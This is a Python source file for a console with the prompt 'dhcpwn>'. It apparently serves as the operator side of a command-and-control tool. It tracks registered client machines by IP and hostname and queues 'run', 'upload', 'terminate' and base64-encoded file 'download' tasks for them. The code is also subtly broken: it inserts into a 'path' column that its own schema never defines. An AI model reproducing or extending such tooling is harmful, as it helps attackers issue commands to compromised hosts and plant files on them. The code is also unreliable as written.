import sqlite3
import os
from datetime import datetime
import base64

DB_PATH = "tasks.db"


def now_iso():
    return datetime.utcnow().isoformat() + "Z"


def init_db(conn):
    conn.execute("""
    CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        action TEXT NOT NULL,
        args TEXT,
        status TEXT NOT NULL DEFAULT 'pending',
        output_json TEXT,
        created_at TEXT NOT NULL,
        completed_at TEXT
    )
    """)
    conn.execute("""
    CREATE TABLE IF NOT EXISTS clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT UNIQUE NOT NULL,
        ip TEXT,
        hostname TEXT,
        broker TEXT,
        last_seen TEXT NOT NULL
    )
    """)
    conn.commit()


def add_task(conn, client_id, action, args, path = None):
    now = now_iso()
    if path:
        conn.execute(
        "INSERT INTO tasks (client_id, action, args, status, created_at, path) VALUES (?, ?, ?, 'pending', ?, ?)",
        (client_id, action, args, now, path)
        )
        conn.commit()
    else:
        conn.execute(
            "INSERT INTO tasks (client_id, action, args, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
            (client_id, action, args, now)
        )
        conn.commit()
    print(f"Added task '{action}' for {client_id or 'ANY'}")


def list_tasks(conn, status=None):
    query = "SELECT id, client_id, action, args, status, created_at FROM tasks"
    params = ()
    if status:
        query += " WHERE status=?"
        params = (status,)
    query += " ORDER BY id DESC"

    rows = conn.execute(query, params).fetchall()
    if not rows:
        print("No tasks found.")
        return
    for r in rows:
        print(f"[{r[0]}] {r[4]} {r[1] or 'ANY'} {r[2]} {r[3]} @ {r[5]}")


def delete_task(conn, task_id):
    conn.execute("DELETE FROM tasks WHERE id=?", (task_id,))
    conn.commit()
    print(f"Deleted task {task_id}")


def show_output(conn, task_id):
    row = conn.execute("SELECT output_json, status FROM tasks WHERE id=?", (task_id,)).fetchone()
    if row:
        output, status = row
        print(f"Task {task_id} [{status}] output:\n{output or '(no output)'}")
    else:
        print("Task not found.")


def list_clients(conn):
    rows = conn.execute("SELECT client_id, hostname, ip, broker, last_seen FROM clients").fetchall()
    if not rows:
        print("No clients registered.")
        return
    for r in rows:
        print(f"{r[0]} @ {r[2]} ({r[1]}) via {r[3]} last seen {r[4]}")


def repl():
    conn = sqlite3.connect(DB_PATH)
    init_db(conn)

    print("CLI ready. Type 'help' for commands.")

    while True:
        try:
            cmd = input("dhcpwn> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting.")
            break

        if cmd == "help":
            print("Commands:")
            print("  add <clientID|ANY> <action> <args>  - Add a task")
            print("  list [status]                       - List tasks (optionally by status)")
            print("  delete <id>                         - Delete a task")
            print("  output <id>                         - Show task output")
            print("  clients                             - List registered clients")
            print("  quit                                - Exit CLI")
        elif cmd.startswith("add "):
            parts = cmd.split(maxsplit=3)
            if len(parts) < 3:
                print("Usage: add <clientID|ANY> <action> <args>")
                continue
            client_id = None if parts[1].upper() == "ANY" else parts[1]
            action = parts[2]
            args = parts[3] if len(parts) > 3 else ""
            if action in ("run", "upload", "terminate"):
                add_task(conn, client_id, action, args)
            elif action == "download":
                name, filepath = args.split(" ")
                with open(os.path.join("downloads", name), "rb") as file:
                    data = base64.b64encode(file.read()).decode("utf-8")
                add_task(conn, client_id, action, data, path=filepath)
            else:
                print("Invalid command type.")
        elif cmd.startswith("list"):
            _, *status = cmd.split()
            list_tasks(conn, status[0] if status else None)
        elif cmd.startswith("delete "):
            _, task_id = cmd.split(maxsplit=1)
            delete_task(conn, task_id)
        elif cmd.startswith("output "):
            _, task_id = cmd.split(maxsplit=1)
            show_output(conn, task_id)
        elif cmd == "clients":
            list_clients(conn)
        elif cmd in ("quit", "exit"):
            break
        else:
            print("Unknown command. Type 'help'.")


if __name__ == "__main__":
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        init_db(conn)
        conn.close()
    repl()
